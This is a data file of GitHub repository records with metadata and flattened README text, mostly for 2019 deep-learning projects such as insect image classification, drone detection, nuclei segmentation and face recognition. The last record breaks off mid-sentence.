Gal-Gilor,The_Linnaeus_Bot,n/a,TheLinnaeusBot Introduction This project utilizes deep learning neural networks to classify images of damselflies and dragonflies and to generate images through image de noising techniques auto encoders For those interested in a shorter recap Presentation Slides https docs google com presentation d 1xrlXFUVkA1hmsYD6TaPTXyuSGk6ACHZHcb40gw1cX0 edit usp sharing Presentation Table of Contents Technical Description technical description Data and EDA data and eda Supervised Model supervised model Unsupervised Model unsupervised model Future Improvements future improvements Technical Description Process For this project I used part of a google competition dataset iNat Challange 2019 https sites google com view fgvc6 competitions inaturalist 2019 iNat Challange 2019 The dataset contained 8462 damselfly images 1 72 GB and 9197 dragonfly images 1 76 GB All the images were resized to have a maximum dimension of 800 pixels and saved as JPEG I then process the images and train a convolutional neural network CNN to distinguish between a dragonfly and a damselfly Additionally I experimented with image de noising techniques using CNN s to generate images of dragonflies for classification purposes Python libraries NumPy https www numpy org Numpy Pillow https pillow readthedocs io en stable Pillow Keras https keras io Keras Scikit learn https scikit learn org stable Sklearn Matplotlib https matplotlib org Matplotlib Plotly https plot ly Plotly Data and EDA The original dataset contained 82 GB of images for various living organisms Due to time constraint I focused on the 8462 damselfly and 9197 dragonfly images As part of the image processing stage I resize every image to 256 by 256 pixels grayscale convert the image to a Numpy array and normalized the pixel values by dividing every pixel by 255 Additionally I augmented the data and created the mirror image to doubled the number of available images Creating the Test Set After preparing the images for analysis I had 16924 215 MB damselfly images and 18394 237 MB dragonfly images The training set comprised of 12694 damselfly and 13797 dragonfly images 26491 images 75 of the data The test set comprised of 4230 damselfly and 4597 dragonfly images 8827 images 25 of the data Due to limited computational power I saved the training and testing sets for damselflies and dragonflies separately in 4 different npy files Supervised model Model Architecture CNN Architecture Images CNNarch png To complete the task of training the CNN batching the data was necessary Every batch consists of 4000 images of which 5 reserved for validation purposes Train on 4000 Images Save Weights Clear Cache Reload Weights Retrain on 4000 New Images Repeat 6 Times 24000 images total After training the model on 24000 images the model achieves 85 accuracy on the testing set 8827 images Confusion matrix Images supervisedcmlabel png Due to the large volumes of data I was unable to ensure the image quality Some of the images were blurry some with dominant background noise and some contained more than 1 animal Thus making the training and classification harder Classified Correctly Original Dragonfly Images correctdragon png What the Model Sees First CNN Layer what the models sees at the first layer Images activation0vis jpg What the Model Sees Second CNN Layer what the models sees at the second layer Images activation1vis jpg What the Model Sees Third CNN Layer what the models sees at the forth layer Images activation4vis jpg What the Model Sees Forth CNN Layer what the models sees at the fifth layer Images activation5vis jpg Misclassified Original Dragonfly Images missdragon png What the Model Sees First CNN Layer what the models sees at the first layer Images missactivation20vis jpg What the Model Sees Second CNN Layer what the models sees at the second layer Images missactivation21vis jpg What the Model Sees Third CNN Layer what the models sees at the forth layer Images missactivation24vis jpg What the Model Sees Forth CNN Layer what the models sees at the fifth layer Images missactivation25vis jpg Unsupervised models Model Architecture Autoencoder Architecture Images autoencodersum png Convolutional Autoencoder Noise Reduction Technique There s still a lot to learn about unsupervised neural networks In this experiment I train a convolutional autoencoder on 18394 dragonfly images of which 2394 images I reserve for validation purposes Because of the large volumes of data training the autoencoder model on a regular local device is a slow process Thus it s still a work in process However using said de noising technique I manage to generate low quality after 15 epochs dragonfly images Additionally as part of the experiment I attempt to classify said generated images Original image Images unsuperviseddragonactual jpg Original image Generated image Images unsuperviseddragoncreated jpg Generated image I then attempted to classify the 2394 dragonfly images using the pre trained classification model Surprisingly the model classified correctly only 825 images 34 less than the random chance for a binary choice 50 Upon careful examination I couldn t find errors such as wrong labeling in the code that could explain the outcome Further inquiry is required Confusion matrix Images unsupervisedcmlabel png Future Improvements 1 Improve Image Preprocessing Given this my first time working with image data and despite the time constraints I am happy with the classification results However I believe additional data preprocessing such as removing background noise and focusing on the insect before image resizing would improve classification results 2 Improve Unsupervised Model Examining the change in loss throughout the training it is evident a deeper neural network autoencoder and additional training would increase the image generator quality Also due to the fact my local machine was unable able to provide adequate resources for training the model I consider outsourcing the training process to external services such as AWS s SageMaker,2019-10-08T15:46:44Z,2019-11-13T19:09:13Z,Jupyter Notebook,Gal-Gilor,User,1,1,0,53,master,Gal-Gilor,1,0,0,0,0,0,0
vinotharjun,VNetAlgorithm,n/a,VNetAlgorithm Pytorch implementation of our own new deep learning architecture called VNet for Image classification task on MNIST CIFAR10 Datasets compared with existing models as well Results alt text https raw githubusercontent com vinotharjun VNetAlgorithm master screenshot png,2019-10-02T20:09:29Z,2019-11-25T16:27:05Z,Jupyter Notebook,vinotharjun,User,1,1,0,7,master,vinotharjun,1,0,0,0,0,0,0
xanjay,filter_images_using_modern_face_recognition,face-recognition#opencv#python#tensorflow,Filter Images Using Modern Face Recognition Train deep learning based face recognition system with only 5 10 images and accurately filter out images of specific person from directory of images Implemented using OpenCV and Tensorflow With the rise of deep learning there are many state of the art deep learning models which can be used for face detection and recognition But they need to be trained on thousands of training samples Instead this project attempts to build face recognition system with near accurcay as state of the art models while training on much less data How does it work See wiki https github com xanjay filterimagesusingmodernfacerecognition wiki how does it work Installation Dependencies Python3 OpenCV Tensorflow Scikit Learn DLib Install the requirements with PIP and get started Better use virtualenv https virtualenv pypa io en latest sh pip install r requirements txt Usage You can train this system to recognize different faces and filter out the images of desired person from the image directory Although this project focuses on image filtering there are many more use cases of face recognition You can inherit the face recognition system used here and apply to your own application Training on your own dataset 1 Organize the training directory with sub directory for each person as follows Note Sub directory should be named after person name which will be used for inference later Maintain equal number of portrait images to each sub directory Minimum number of images is 5 Use more images to get better results trainingimages elon image1 jpg image2 jpg mark image1 jpg image2 jpg unknown image1 jpg image2 jpg 2 Run train py script as follows by passing the directory and algortihm to use sh train py d trainingimages a knn a is optional By default k nearest neighbors is used You can pass one of knn or svm SVM works better only if the number of images per person is greater than 10 Making Inference To test the trained model run sh testfacerecognition py i testimage jpg To filter images of desired person run the following script by passing source directory and person It filters the images containing elon from imagesdir to output directory sh facerecognizer py d imagesdir p elon Since it is not feasible to copy images to output directory when source directory size is very large So output directory contains only shortcuts to images and a text file containing image file path References facenet paper https www cv foundation org openaccess contentcvpr2015 app 1A089 pdf Openface https cmusatyalab github io openface MTCNN https github com ipazc mtcnn face alignment https www pyimagesearch com 2017 05 22 face alignment with opencv and python,2019-10-24T14:53:20Z,2019-10-25T15:20:46Z,Python,xanjay,User,1,1,0,8,master,xanjay,1,0,0,0,0,0,0
gtdhm,Pytorch_Template,classification-model#deeplearning#example-project#pytorch#template,PytorchTemplate You only need three step to use a functional template project for your any missions A deep learning project template with simple modification based on Pytorch 1 Strong scalability 2 Clear structure 3 Three step to modify 4 Easy to migrate RELATED LINKS KerasTemplate https github com gtdhm KerasTemplate https github com gtdhm KerasTemplate PytorchTemplate https github com gtdhm PytorchTemplate https github com gtdhm PytorchTemplate Requirements Github https img shields io badge python v3 6 blue svg style for the badge logo python Github https img shields io badge Pytorch v0 4 1 orange svg style for the badge logo Pytorch Github https img shields io badge Torchvision v0 2 1 11B48A svg style for the badge logo Vine Python 3 5 3 6 recommended numpy matplotlib torch 0 4 1 1 1 0 recommended torchvision 0 2 1 0 3 0 recommended Structures pytorchtemplate database Load and transform the datasets to the model as inputs init py use DataLoader to get batch datasets basedataset py dataset Store the original datasets and its label files binaryclassdemo multiclassdemo model The center of whole project init py basemodel py to initialize and control the model training and testing processes basenetwork py the whole network architectures implementation baseloss py add your own loss here which is out of Pytorch option Total configurations and options of the model init py baseoptions py trainoptions py testoptions py util Useful tools for the model init py utils py the set of some helper functions metrics py evaluation metircs of the model visuals py directly observe the operation of the model and network workdir The output for training and testing script Main script to train or test the project train sh test sh train py Train and val the model test py Test or evaluate the model Demo The template has prepared all you needs to run including multi classification dataset and trained checkpoint So you can feel free to modify the training and testing options in scrip train sh or test sh Bash git clone https github com gtdhm PytorchTemplate git cd PytorchTemplate train python3 script train sh test python3 script test sh Run results on the command line Image workdir a jpg Image workdir b jpg Image workdir c jpg Image workdir e jpg Image workdir f jpg Usage This will show you how to modify this template step by step simply In other words where you need to adapt to different project tasks and the rest you don t need to modify KEY You just need to modify the code between Python TODO User code TODO User End 1 modify the option baseoptions py Python TODO User modify the class name of your labels in Order self classname zero one two three four five TODO User End trainoptions py and testoptions py Python def addparser self TODO User add your own train or test parse parser addargument TODO User End 2 modify the database basedataset py Python def addtodatabase self index dataset path TODO User add your own data encoding self labelinfo update self imageinfo update TODO User End def getitem self index TODO User return your own data meta and transform image self transform image return image self labelinfo index self imageinfo index imagename TODO User End 3 modify the model basemodel py Python class BaseModel object def init self cfg TODO User redefine the following self network self optimizer self criterion TODO User End def input self images labels TODO Usr modify the images labels to adapt the self network input self batchx self batchy TODO User End basenetwork py Python class BaseNetwork nn Module def init self cfg TODO Usr redefine following layers self net nn Sequential TODO User End def forward self x TODO Usr redefine following forward step out self net x return out TODO User End License This project is licensed under the MIT License See LICENSE for more details,2019-10-23T07:44:00Z,2019-11-18T10:25:08Z,Python,gtdhm,User,1,1,0,10,master,gtdhm,1,0,0,0,0,0,0
zhanshenlc,AI4Animation,computer-animation#reinforcement-learning#unity3d,AI4Animation Description This project explores the opportunities of deep learning and artificial intelligence for character animation and control as part of my Ph D research at the University of Edinburgh in the School of Informatics supervised by Taku Komura and in collaboration with He Zhang and Jun Saito The development is done using Unity3D Tensorflow and the implementations are made available during my Ph D progress SIGGRAPH 2018 Animating characters can be a pain especially those four legged monsters This year we will be presenting our recent research on quadruped animation and character control at the SIGGRAPH 2018 in Vancouver The system can produce natural animations from real motion data using a novel neural network architecture called Mode Adaptive Neural Networks Instead of optimising a fixed group of weights the system learns to dynamically blend a group of weights into a further neural network based on the current state of the character That said the system does not require labels for the phase or locomotion gaits but can learn from unstructured motion capture data in an end to end fashion Video Paper Windows Demo Linux Demo Mac Demo MoCap Data ReadMe SIGGRAPH 2017 This work continues the recent work on PFNN Phase Functioned Neural Networks for character control A demo in Unity3D using the original weights for terrain adaptive locomotion is contained in the Assets Demo SIGGRAPH2017 Original folder Another demo on flat ground using the Adam character is contained in the Assets Demo SIGGRAPH2017 Adam folder In order to run them you need to download the neural network weights from the link provided in the Link txt file extract them into the NN folder and store the parameters via the custom inspector button Video Paper Windows Demo Linux Demo Mac Demo Processing Pipeline In progress More information will be added soon Copyright Information This code implementation is only for research or education purposes and especially the learned data not freely available for commercial use or redistribution The intellectual property and code implementation belongs to the University of Edinburgh Licensing is possible if you want to apply this research for commercial use For scientific use please reference this repository together with the relevant publications below In any case I would ask you to contact me if you intend to seriously use redistribute or publish anything related to this code or repository,2019-09-30T10:21:40Z,2019-10-28T00:27:46Z,C++,zhanshenlc,User,1,1,0,14,master,zhanshenlc#sebastianstarke,2,0,0,0,0,0,0
NikolayVaklinov10,Facial_expression_recognition,n/a,,2019-09-25T10:58:01Z,2019-11-02T17:46:05Z,Python,NikolayVaklinov10,User,1,1,0,7,master,NikolayVaklinov10,1,0,0,0,0,0,0
Khalid-Sultan,Solar-Energy-Prediction-using-ML-alongside-Flask-Website,d3js#deep-learning#deep-neural-networks#flask#javascript#machine-learning,,2019-10-10T08:18:08Z,2019-10-23T20:48:19Z,JavaScript,Khalid-Sultan,User,1,1,0,6,master,Khalid-Sultan,1,0,0,0,0,0,0
ContinualAL,DEVFNN,n/a,DEVFNN An Incremental Construction of Deep Neuro Fuzzy System for Continual Learning of Non stationary Data Streams IEEE Transactions on Fuzzy Systems Early Access Abstract Existing fuzzy neural networks FNNs are mostly developed under a shallow network configuration having lower generalization power than those of deep structures This paper proposes a novel self organizing deep fuzzy neural network namely deep evolving fuzzy neural networks DEVFNN Fuzzy rules can be automatically extracted from data streams or removed if they play little role during their lifespan The structure of the network can be deepened on demand by stacking additional layers using a drift detection method which not only detects the covariate drift variations of input space but also accurately identifies the real drift dynamic changes of both feature space and target space DEVFNN is developed under the stacked generalization principle via the feature augmentation concept where a recently developed algorithm namely Generic Classifier gClass drives the hidden layer It is equipped by an automatic feature selection method which controls activation and deactivation of input attributes to induce varying subsets of input features A deep network simplification procedure is put forward using the concept of hidden layer merging to prevent uncontrollable growth of input space dimension due to the nature of feature augmentation approach in building a deep network structure DEVFNN works in the sample wise fashion and is compatible for data stream applications The efficacy of DEVFNN has been thoroughly evaluated using seven datasets with non stationary properties under the prequential test then train protocol It has been compared with four state of the art data stream methods and its shallow counterpart where DEVFNN demonstrates improvement of classification accuracy Moreover it is also shown that the concept drift detection method is an effective tool to control the depth of network structure while the hidden layer merging scenario is capable of simplifying the network complexity of a deep network with negligible compromise of generalization performance,2019-10-29T02:34:41Z,2019-11-05T15:41:40Z,MATLAB,ContinualAL,User,1,1,0,15,master,ContinualAL,1,0,0,0,0,0,0
sadam-99,X-RAY-IMAGES-BONES-SEGMENTATION-AND-FRACTURE-LOCATOR,n/a,X RAY IMAGES BONES SEGMENTATION AND FRACTURE LOCATOR Segmentation of different types of bones using Thresholding and morphological operations and detected located fracture using Hough Transform in MATLAB Tried with Deep Learning ML algorithms for better accuracy,2019-09-23T22:41:12Z,2019-09-23T23:39:44Z,MATLAB,sadam-99,User,1,1,0,2,master,sadam-99,1,0,0,0,0,0,0
SlapBot,drone-detection,n/a,Drone Detection Dronacharya A deep learning neural net model to detect drone drones from a given picture using Using Fast R CNN architecture via Keras Retinanet Implementation Dataset and Pre Trained model provided Live at http dronacharya slapbot ml Motivation motivation Features features Installation installation Pre Requisites pre requisites Prediction prediction System Setup system setup Application Setup application setup Usage usage Training system setup GCP Instance gcp instance Graphic Card Drivers Setup graphic card drivers setup Install CUDA 8 0 install cuda 8 0 Install cuDNN 6 0 install cudnn 6 0 Training The Network training the network Usage usage Advanced API advanced api Results results Motivation Me and my partner Nilesh https github com nileshtrivedi participated in a Hackathon called MoveHack https pib gov in newsite PrintRelease aspx relid 181379 which had one of the problem statement of Drone and UAV traffic management One of the key challenges of the problem statement was to detect any UAV or Drone from a given image I took the challenge by researching online of different techniques of detecting objects from a given picture and with a prior of experience of using Fast R CNN architecture in my workplace I just went with it to see how it fares against drone detection https github com SlapBot drone detection blob master screenshots 1 gif Features A pre trained model is included in the repository ready to be used out of the box for drone detections Multiple drones can be detected from an image Dataset used to train the model with clear instructions are provided in the case you d want to train over a larger dataset Simple Intuitive API is provided to help in prediction task with full control over tolerance of detecting drones The entire source code is well documented and uses type hinting for more stability The installation instructions are separated into two categories depending on your use case Training Well documented instructions from scratch to getting the model trained Prediction Specific instructions to simply use pre trained model right off the bat and go with the workflow Installation Installation is divided into two parts Prediction You d want to use pre trained model to detect drones in a given image Training You d want to train the model with larger dataset fine tine hyper parameter etc Pre requisites 1 Python3 2 pip 3 virtualenv Prediction System Setup 1 Update the package index sudo apt get update 2 Install Additional development libraries sudo apt get install python3 dev python3 pip libcupti dev 3 Install Additional system libraries sudo apt get install libsm6 libxrender1 libfontconfig1 4 Download the pre trained model to the Trained Model directory under name drone detection v5 h5 from this link https drive google com open id 1nRMPUQcW9U6E3WjlP751s77U9a0R5A9 Application Setup 1 Clone the repo git clone https github com slapbot drone detection 2 Cd into the directory cd drone detection 3 Create a virtual env for python python m venv drone detection env 4 Activate the virtual env source drone detection env bin activate 5 Upgrade your pip to latest version pip install upgrade pip 6 Install numpy pip install numpy 1 17 0 7 Install the application dependencies pip install r requirements txt This will install Tensorflow CPU if you want to install GPU version swap out tensorflow with tensorflow gpu in requirements txt 8 Run python evaluate py to detect drones from one of the test image saved in the Dataset folder Usage As you can see below the API is super intuitive and self explaining to use from core import Core c Core imagefilename c currentpath DataSets Drones testImages 351 jpg image c loadimagebypath imagefilename drawingimage c getdrawingimage image processedimage scale c preprocessimage image c setmodel c getmodel boxes scores labels c predictwithgraphloadedmodel processedimage scale detections c drawboxesinimage drawingimage boxes scores c visualize drawingimage Training GCP Instance Create a virtual machine with these specifications You re open to use any other host provider or VM its just what I did in the process CPU 8 core 30 GB memory server location us west1 b GPU 1 Nvidia Tesla K80 Graphic Card Drivers Setup Install CUDA 8 0 1 Update Repositories sudo apt get update 2 Create an installation shell script nano installcuda sh bin bash echo Checking for CUDA and installing Check for CUDA and try to install if dpkg query W cuda then The 16 04 installer works with 16 10 curl O http developer download nvidia com compute cuda repos ubuntu1604 x8664 cuda repo ubuntu16048 0 61 1amd64 deb dpkg i cuda repo ubuntu16048 0 61 1amd64 deb apt get update apt get install cuda y sudo apt get install cuda 8 0 fi 3 Login as root user sudo su 4 Install Cuda 8 0 installcuda sh 5 Verify the installation nvidia smi 6 Export required env variables echo export CUDAHOME usr local cuda bashrc echo export PATH PATH CUDAHOME bin bashrc echo export LDLIBRARYPATH CUDAHOME lib64 bashrc source bashrc Install cuDNN 6 0 1 Download cuDNN from Nvidia Main website 6 0 version in my case I saved it in private repo git clone https slapbot bitbucket org slapbot cudnn git 2 Cd in directory cd cudnn 3 Install deb package sudo dkpg i libcudnn66 0 21 1 cuda8 0amd64 deb Python Setup 1 Install python packages sudo apt get install python3 dev python3 pip libcupti dev 2 Install Tensorflow GPU 1 4 pip3 install upgrade tensorflow gpu 1 4 0 3 Verify Tensorflow Installation python3 c import tensorflow as tf print tf version Drone Detection Setup 1 Clone the repo git clone https github com slapbot drone detection 2 Cd into the directory cd drone detection 3 Clone keras retinanet repo git clone https github com fizyr keras retinanet git 4 Cd in keras retinanet repo cd keras retinanet 5 Install package pip3 install user 6 Install repository wide deps python3 setup py buildext inplace 7 Return back to main directory cd Training the network 1 Generate annotations labels and validation annotations python3 datapreparation py 2 Install More packages if necessary want to visualise pip install opencv python pip install Pillow 3 Train the model using python3 keras retinanet kerasretinanet bin train py csv annotations csv classes csv val annotations validationannotations csv 4 Convert the trained model to inference model python3 keras retinanet kerasretinanet bin convertmodel py resnet50csv05 h5 resnet50csv05inference h5 5 Now simply copy back the model to Trained Model directory and follow the prediction instructions to get started with predicting Usage The API is super straightforward and intuitive to understand and consume taking a look at the evaluate py should give you a rough understanding of its functioning from core import Core c Core imagefilename c currentpath DataSets Drones testImages 351 jpg image c loadimagebypath imagefilename drawingimage c getdrawingimage image processedimage scale c preprocessimage image c setmodel c getmodel boxes scores labels c predictwithgraphloadedmodel processedimage scale detections c drawboxesinimage drawingimage boxes scores c visualize drawingimage Advanced API boxes scores labels c predictwithgraphloadedmodel processedimage scale returns you the boxes scores and labels of the objects found in our case labels are just used to do binary classification so there are only two labels Each item of box has an associated score so boxes 0 co relates with scores 0 and so on depending on the score you can say whether its a drone or not after experimenting I ve figured that 0 5 is a good threshold value for tolerance Results Prototyped in MoveHack http pib gov in newsite PrintRelease aspx relid 181379 Was selected as top 10 overall solutions across all challenge themes among 7 500 individuals and 3 000 teams https www thehindubusinessline com info tech 7500 individuals register for movehack niti aayogs global mobility hackathon article24736986 ece that globally competed for Hackathon Won the cash prize of 10 00 000 and received an invitation to attend the Global Mobility Summit 2018 http movesummit in about php at Vigyan Bhawan Delhi by NITI AAYOG to meet major CEOs across automobiles aviation mobility organisations and receive the award by Prime Minister of India Narendra Modi,2019-10-08T18:11:43Z,2019-10-17T05:20:41Z,Python,SlapBot,User,1,1,0,1,master,SlapBot,1,0,0,0,0,0,1
1024er,Dive-into-DL-PaddlePaddle,n/a,Dive into DL PaddlePaddle coming soon,2019-09-30T07:42:16Z,2019-12-12T15:28:25Z,n/a,1024er,User,1,1,1,1,master,1024er,1,0,0,0,0,0,0
ruchikaverma-iitg,Nuclei-Segmentation,n/a,Nuclei Segmentation This repository contains an implementation of Mask R CNN algorithm using Matterport library https github com matterport MaskRCNN for nuclei segmentation from whole slide images of tissue sections Description Nuclei segmentation using Mask R CNN based on the ResNet 50 backbone This model was trained using data from our IEEE TMI paper and MoNuSeg challenge https monuseg grand challenge org Please cite the following papers if you use this code or data for your work Kumar N Verma R et al A Multi organ Nucleus Segmentation Challenge in IEEE Transactions on Medical Imaging 2019 in press https ieeexplore ieee org document 8880654 Kumar N Verma R Sharma S Bhargava S Vahadane A Sethi A 2017 A dataset and a technique for generalized nuclear segmentation for computational pathology IEEE transactions on medical imaging 36 7 1550 1560 https ieeexplore ieee org document 7872382 Feel free to use the testing script with available model weights to check the performance of trained model using the following links Testing code https github com ruchikaverma iitg Nuclei Segmentation blob master NucleiSegmentationtestingcode ipynb Trained weights https drive google com open id 16oPaebQnZCMzEsEGvhSVPMvEhbKJPATQ,2019-10-04T05:12:13Z,2019-11-10T03:24:51Z,Jupyter Notebook,ruchikaverma-iitg,User,1,1,2,24,master,ruchikaverma-iitg,1,0,0,1,0,0,0
vbelus,falling-liquid-film-drl,n/a,Deep Reinforcement Learning control of the unstable falling liquid film no control https media giphy com media cO3IdQaGRyK0BYAslz giphy gif control https media giphy com media dY0qmKEb5bXhf3gHvs giphy gif I used this code in the paper Exploiting locality and physical invariants to design effective Deep Reinforcement Learning control of the unstable falling liquid film that you can check out here https aip scitation org doi 10 1063 1 5132378 https aip scitation org doi 10 1063 1 5132378 If you find this work useful and or use it in your own research please cite our works V Belus J Rabault J Viquerat Z Che E Hachem and U Reglade Exploiting locality and physical invariants to design effective Deep Reinforcement Learning control of the unstable falling liquid film ArXiv 2019 This README will be in three parts The first part will be about the code in itself The second part will be about getting an environment ready to run the code either in a docker container or in Ubuntu The third part will be about the details of how to train a model 1 What you can find in this repo The code is in drlfluidfilmpython3 gym film You find the following files param py contains the parameters that your next training will use all the parameters of the project are centralized here train py is the script you will use to train or render a model In gymfilm you will find the following directories envs where our basic environment class filmenv py is defined It is a custom gym environment and it interacts with the C simulation that is defined in simulationsolver model where the script to retrieve models is defined These models are imported from the library stablebaselines and only the PPO2 implementation has been used in the paper results where previously trained models are stored along with the parameters used for the training and tensorboard logs to have insights on how the model performs during training 2 You need an environment in which you can run the code Because the simulation is built from scratch in C and linked with the Python API with the library Boost Python you need to have the library installed for the simulation to run The easiest way is to run the code in a docker container built from a Ubuntu 18 04 image This way you can run the code whether you are on Windows MacOS or Linux as long as you can run docker Run it with docker recommended Docker is a convenient tool to use containers If you re not familiar with the concept everything you need to run code from this project will be inside the container In this case it will be an Ubuntu 18 04 distribution with Python3 and other necessary packages The details of how I built my docker image from ubuntu latest are in this repository https github com vbelus dockerfluidfilm You can find all these steps in the Dockerfile Once you can use Docker get the image from the Dockerfile by running the following command in the same directory as the Dockerfile this can take several minutes or more depending on your internet connection and the docker image will take 2 4GB on your disk shell docker build t falling liquid film latest by downloading it from the following adress https folk uio no jeanra Research falling liquid filmlatest tar gz You can then run a container from this image with the following command shell docker run it falling liquid film latest You should now be in the gym film folder ready to launch trainings XX make display possible Run it with Ubuntu You can install the dependencies on your own Ubuntu distribution as is done when building the Docker image The details are in this repository https github com vbelus dockerfluidfilm after the Packages I installed step by step section 3 How do I train some models Execute the main script The basic command is python3 train py but you will need to add some flags train or t to train your model render or r if you want to render the simulation If you use this flag with t it will render during the training as well You can change how often the rendering is done with the RENDERPERIOD parameter trainingname or tn is the name of the training default value is test load or l followed by an integer n to load a trained model This will look for a model trained for n episodes under the training name you specified loadbest or lb will load the best model under the training name you specified best meaning the model trained on k episodes where the maximum episode reward of the entire training was obtained during episode k port or p followed by an integer between 1024 and 49151 which will be the port used when using the multi environment method Method M3 in the paper If you want to train a model with the default parameters and render it you can do it with python train py train render trainingname my first training Change the parameters of the training All the parameters relevant to the training and simulation are in param py You will have to change the parameters in this file We will use the following syntax parameter type typical low value typical high value Some important parameters here are The number of jets njets int 1 20 The position of the jets jetsposition array OR positionfirstjet float and spacebetweenjets float 5 20 The maximum power of the jets JETMAXPOWER float 1 15 and their width JETWIDTH float 2 10 As it is done the action of the agent is always between 1 and 1 and is later normalized and multiplied by JETMAXPOWER to be applied in the simulation The default values are letting the jets modify q with the same amplitude as the waves naturally forming so it should be enough for control The size of the observation sizeobs float 10 40 input of the agent and the size of the observation on which the reward is calculated sizeobstoreward float 5 20 The non dimensional duration of one episode simulationtime float 5 20 The duration of the simulation before we begin any training initialwaitingtime float Default value is 200 letting the simulation get to a converged state before we do any training the state is stored and not computed each time simulationsteptime is the non dimensional duration of one step of the simulation In one such step we do nstep steps of the numerical scheme Whether to render the simulation with matplotlib with render bool If True render it every RENDERPERIOD int environment steps That would be nice if I could visualize all that in a jupyter notebook And that is exactly what you can do here LINK TO THE NOTEBOOK REPO https github com vbelus drl fluid film notebook You need Docker to run this This notebook will demonstrate how the three implemented methods build on top of each other and you will be able to look at what the different parameters do on the simulation interactively I made it for a course on Deep Reinforcement Learning at my school Mines ParisTech PSL University,2019-09-27T08:45:18Z,2019-12-10T16:00:32Z,Python,vbelus,User,2,1,1,14,master,vbelus,1,0,0,1,3,0,0
alvarillo89,Glands-detection,computer-vision#convolutional-neural-networks#deep-learning#deep-neural-networks#digital-image-processing#digital-pathology#keras-tensorflow#neural-network#opencv#prostate-cancer#whole-slide-imaging,Glands detection in prostate biopsies A deep learning algorithm based on convolutional neural networks to detect glandular cells in digitalized biopsies of the prostate Performed as final degree work for the degree in computer engineering Abstract Cancer is constituted as the second cause of global death and specifically that of prostate it is the second type with the highest number of new cases identified each year in Spain and the most deadly among the male popula tion An effective way to diagnose it is through the pathological anatomy a sample of tissue is removed from the organ in question biopsy that is sub sequently analyzed under a microscope by a specialist However advances in the field of digital image processing have allowed the emergence of a new technique digital pathology Biopsies are processed by powerful scanners that generate high resolution images that can be analyzed through softwa re The creation of an algorithm a diagnostic aid tool is proposed to detect in these images prostate glandular cells the biological structures in which cancer becomes visible using convolutional neural networks and computer vision techniques while studying its performance in large images,2019-10-03T09:04:45Z,2019-11-07T14:31:15Z,Python,alvarillo89,User,1,1,1,7,master,alvarillo89,1,0,0,0,1,1,1
trivizakis,devfest-greece-19,cnn-keras#deep-learning#devfest19#python3#transfer-learning,devfest greece 19 A fun and cringy overview of deep learning in medical image and biosignal analytics In this session we will discuss current trends and how to develop an end to end and fully automatic data analysis pipeline https gdggreece gr devfest greece 2019,2019-09-22T13:34:34Z,2019-10-10T12:40:00Z,Jupyter Notebook,trivizakis,User,2,1,0,19,master,trivizakis,1,0,0,0,0,0,0
anandkashyap4711,iNeuron-Assignment-,n/a,iNeuron Data Science Assignment This Folder contains ML for Deployment batch which has been running by iNeuron ai company In which i am keep on learning so many Data science concept like Stat ML Python Analytics Deployment Deep Learning NLP Step By step i am completing assignment which has been assigned by iNeuron,2019-10-15T02:55:31Z,2019-11-28T16:27:28Z,Jupyter Notebook,anandkashyap4711,User,1,1,0,14,master,anandkashyap4711,1,0,0,0,0,0,0
abel06,EthioAi,n/a,EthioAi Over the past few years Weve read and watched dozens of explanations and the distinction Weve found most useful is right there in the name machine learning is all about enabling computers to learn on their own But what that means is a much bigger question today from simple tasks such as recognizing spam emails which once was difficult to robots that can recognize their environment are using machine learning so we found that it is important to empower our youth with the basic knowledge needed to understand machine learning before diving to complex concepts such as a deep neural network,2019-09-21T20:18:46Z,2019-09-25T07:29:55Z,Jupyter Notebook,abel06,User,1,1,0,8,master,abel06,1,0,0,0,0,0,0
Sandeep-Panchal,Lunar-Rock-Classification,n/a,,2019-10-29T06:59:24Z,2019-10-30T16:29:35Z,Jupyter Notebook,Sandeep-Panchal,User,1,1,0,3,master,Sandeep-Panchal,1,0,0,0,0,0,0
imbhavesh28,CogniTrack,n/a,CogniTrack CogniTrack https cognitrackproject firebaseapp com assets hero png Raspberry Pi Client https github com ArjunInventor CogniTrack RPi Website https CogniTrackProject firebaseapp com Overview CogniTrack is an Artificial Intelligence powered person tracking system that acquires images from CCTV cameras in stream or in batch and track individuals appearing in the frame in real time Features Search for members and immediately see real time footage of CCTV Camera currently pointing at them Recieve alerts when CCTV camera view is blocked or an unauthorised user enters premis Add modify and delete members in real time from Admin Web Interface Getting Started 1 Install dependencies pip install r requirements txt 2 Run index py python index py License The project is published under the MIT license which means that you can use it for any purpose personal or commercial There is no obligation to publish your source code,2019-10-19T18:14:06Z,2019-10-19T18:19:26Z,Python,imbhavesh28,User,1,1,0,2,master,imbhavesh28,1,0,0,0,0,1,0
bajpaiaviral,Imdb_Sentiment_Analysis,n/a,ImdbSentimentAnalysis Text classification Sentiment analysis It is a natural language processing problem where text is understood and the underlying intent is predicted Here you need to predict the sentiment of movie reviews as either positive or negative in Python using the Keras deep learning library Data description The dataset is the Large Movie Review Dataset often referred to as the IMDB dataset The Large Movie Review Dataset http ai stanford edu amaas data sentiment often referred to as the IMDB dataset contains 25 000 highly polar movie reviews good or bad for training and the same amount again for testing The problem is to determine whether a given moving review has a positive or negative sentiment Reviews have been preprocessed and each review is encoded as a sequence of word indexes integers,2019-10-01T09:55:07Z,2019-10-01T09:59:20Z,Python,bajpaiaviral,User,1,1,0,2,master,bajpaiaviral,1,0,0,0,0,0,0
savan007,Mini_Rover,n/a,,2019-10-16T17:15:18Z,2019-10-17T18:17:51Z,Python,savan007,User,1,1,0,1,master,savan007,1,0,0,0,0,0,0
giangnguyen2710,Cinnamon-AI-Jobs,n/a,Cinnamon AI Who we are Cinnamon is the pioneer in consulting and designing innovative solutions using Deep Learning backed AI products Cinnamon continues to enhance the core technologies of the AI platforms and build AI products to drive Business Process Re engineering of large corporations By releasing our core products Flax Scanner and Rossa Voice were creating a new generation of business automation which will disrupt multiple industries in the near future Cinnamons business is rapidly growing after releasing our products on February 2017 we have raised 15 million USD for Series B in January 2019 as well as exposed to global media Besides Cinnamon also focuses on building a strong human resource foundation Until 2019 there are 70 AI talents working in Cinnamon and about 75 of them has graduated Master or PhD at international universities France Australia Swiss Japan Korea Our Products Were not an academic research institute Were a global AI product company Our focus is to create applicable AI products which can bring huge impact to users In order to do so our solutions is the combination of innovative AI core technology and solid business understanding There are 3 main categories Cinnamon ai is an AI Document Reader to automate the data extraction from unstructured documents Businesses suffer from excessive repetitive tasks and waste millions of hours because of the need for humans to read documents Business documents are usually unstructured such as Invoices Financial Statements etc Cinnamon ai enables enterprises to automate those data extraction and processing tasks reducing the cost and speeding up the operations This tool can apply for both hand writing and text data Example Invoice Receipt Insurance Claim Financial Statement etc Why will you love working with Us We strongly 